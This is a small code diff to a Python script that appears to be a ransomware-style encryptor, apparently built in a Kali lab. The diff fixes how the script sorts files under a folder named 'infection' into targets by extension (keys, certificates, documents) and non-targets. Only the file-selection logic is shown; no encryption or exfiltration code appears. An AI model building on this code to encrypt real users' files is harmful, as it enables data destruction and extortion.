@@ -8,6 +8,7 @@ from colorama import Fore, Back, Style
 def	get_files():
 	files = []
 	no_encrypt = []
+	#no_encrypt.append("hola")
 	directorys = []
 	encrypt_path = '/home/kali/infection'
 	ext_to_encrypt = ['.der','.pfx','.crt','csr','p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
@@ -38,8 +39,8 @@ def	get_files():
 			if os.path.isfile(encrypt_path + '/' + file):
 				if file_extension in ext_to_encrypt:
 					files.append(encrypt_path + '/' + file)
-			elif os.path.isfile(encrypt_path + '/' + file):
-				no_encrypt.append(encrypt_path + '/' + file)
+				else:
+					no_encrypt.append(encrypt_path + '/' + file)
 			else:
 				directorys.append(encrypt_path + '/' + file)
 	except:
